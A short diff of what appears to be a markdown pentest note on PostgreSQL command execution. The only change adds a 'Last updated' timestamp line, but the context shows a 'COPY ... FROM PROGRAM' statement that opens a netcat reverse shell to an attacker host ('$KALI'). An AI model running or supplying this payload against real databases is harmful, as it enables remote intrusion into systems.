@@ -104,3 +104,6 @@ DELETE FROM cmd_exec;
 ```sql - postgresql
 COPY cmd_exec FROM PROGRAM 'nc -n $KALI 80 -e /usr/bin/bash';
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
